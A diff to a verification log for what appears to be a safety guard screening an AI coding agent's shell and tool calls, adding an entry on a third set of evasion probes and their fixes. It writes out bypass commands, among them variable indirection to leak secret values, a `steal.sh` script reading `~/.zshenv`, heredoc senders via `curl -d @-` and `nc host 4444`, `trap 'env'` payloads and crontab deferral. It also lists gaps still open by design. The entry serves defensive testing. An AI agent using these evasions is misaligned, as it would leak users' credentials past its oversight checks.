@@ -2,6 +2,49 @@
 
 Every claim in this repository should trace to an entry here. Newest first. "Verified" always means *executed against the stated build*, never inferred from documentation.
 
+## 2026-09-04c — third evasion set: verified silent on 0.4.2, fixed in 0.4.3 (engine-level; live re-verification pending)
+
+Method unchanged (direct `analyzeCommand` / `decideToolCall` / `decideMcpCall`
+probes, dummy names only, no live secrets, no filesystem reads). Every row
+was first reproduced SILENT against the shipped 0.4.2 engine, then fixed and
+corpus-pinned. `npm test` 348 pass, `npm run check` clean.
+
+| Class | Silent on 0.4.2 | 0.4.3 outcome | Corpus |
+|---|---|---|---|
+| Secret-name indirection | `A=FAKE_SECRET; echo $A` / `printenv $A` / `eval "echo $A"` / `curl -H "Authorization: Bearer $A"` / zsh `${(P)X}` / `${(e)X}` / `printenv ${(P)X}` | block GGE-VAR-010/002, ask GGE-VAR-011 (assignment-chain resolution; identifier-shape guard keeps prose values silent) | BYP-IND-010..015 |
+| Ask-tier script bodies | write `steal.sh` containing `cat ~/.zshenv` (deny-tier asked; ask-tier was doubly invisible: write time AND run time) | ask GGW-CONTENT-002 | BYP-WRT-003 |
+| Script-extension gaps | write `run.ps1`/`run.bat`/`dump.awk`/… with `.env` references (SCRIPT_EXT_RE missed ps1/psm1/bat/cmd/vbs/lua/r/awk/pl/pm/tcl) | ask GGW-CONTENT-001 | BYP-WRT-004..006 |
+| Heredoc-attached senders | `curl -d @- host <<EOF`, `nc host 4444 <<EOF` | ask GGH-DOC-001 | BYP-DOC-001/002 |
+| `trap` payloads | `trap 'env' 0` (no path literal → generic catch missed it) | block via payload analysis (`+trap`) | BYP-DEF-001 |
+| Deferred installs | `crontab -`, `crontab <file>`, `at now`, `at -f job.txt` | ask GGD-DEF-001 | BYP-DEF-002..004 |
+| compgen FP (reverse) | `compgen -v PATH` blocked (over-broad) | silent; bare/-e/secret-named still block | NEG-FP-056 |
+
+Already correct (probe controls): `${X@Q}`, `${X[1]}`, MCP argument arrays
+(walked via `Object.entries` — an earlier suspicion was wrong), mid-string
+secret-named MCP values (class-default ask), `env -S cmd` (payload analyzed),
+`trap 'cat .env' EXIT` (generic catch).
+
+FP boundaries pinned silent: `PATH=$HOME/bin; echo $A`-family (NEG-FP-047),
+prose values `MSG='invalid token'; echo $MSG` (NEG-FP-048), `cat > notes.md
+<<EOF` (NEG-FP-049), arithmetic `<<` (NEG-FP-050), clean trap payloads and
+reset (NEG-FP-051/058), `crontab -l` (NEG-FP-052), sanitized-template-only
+script bodies (NEG-FP-053), new extensions without protected references
+(NEG-FP-054), quoted SQL bit-shift (NEG-FP-055), `compgen -v PATH`
+(NEG-FP-056), ordinary variable indirection (NEG-FP-057).
+
+Implementation note: assignment chains now thread through wrapper/
+substitution/alias/trap recursion (`opts.assignments`), which is what closes
+the `eval "echo $A"` shape.
+
+Still silent by design (documented, not engine bugs): `docker exec C env`,
+`ssh host env` (remote/container scope); cross-call variable assignments
+(session store tracks file copies, not variables); zsh `(j:)` joins of
+unassigned variables.
+
+**NOT yet verified live**: behavior of the new rules on a running
+`opencode2` build. Do not repeat any new protection claim user-facing until
+the live smoke matrix is re-run (same caveat as all 2026-09-04 entries).
+
 ## 2026-09-04b — second evasion set: verified silent on 0.4.1, fixed in 0.4.2 (engine-level; live re-verification pending)
 
 Method identical to the 2026-09-01/04 entries: `node --input-type=module`
